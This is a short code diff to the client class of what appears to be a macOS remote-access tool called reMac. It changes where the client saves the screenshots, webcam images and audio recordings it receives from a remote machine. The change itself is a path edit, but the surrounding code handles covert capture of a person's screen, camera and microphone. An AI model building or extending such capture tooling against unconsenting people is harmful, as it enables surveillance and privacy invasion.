@@ -54,7 +54,7 @@ class reMac_libclient(reMac_libbase):
             print(content.get("result"))
         elif action.startswith("sc"):
             print(content.get("result"))
-            cur_dir = os.path.abspath(".")
+            cur_dir = os.path.abspath("../../libs")
             base64ToolContent = content.get("result")
             base64ToolContent = base64ToolContent.encode()
             audio_out = f"{cur_dir}/tmp/screenshot.png"
@@ -62,7 +62,7 @@ class reMac_libclient(reMac_libbase):
                 output_file.write(base64.b64decode(base64ToolContent))
         elif action.startswith("wc"):
             print(content.get("result"))
-            cur_dir = os.path.abspath(".")
+            cur_dir = os.path.abspath("../../libs")
             base64ToolContent = content.get("result")
             base64ToolContent = base64ToolContent.encode()
             audio_out = f"{cur_dir}/tmp/webcam.png"
@@ -70,7 +70,7 @@ class reMac_libclient(reMac_libbase):
                 output_file.write(base64.b64decode(base64ToolContent))
         elif action.startswith("rm"):
             print(content.get("result"))
-            cur_dir = os.path.abspath(".")
+            cur_dir = os.path.abspath("../../libs")
             base64ToolContent = content.get("result")
             base64ToolContent = base64ToolContent.encode()
             audio_out = f"{cur_dir}/tmp/audio.mp3"
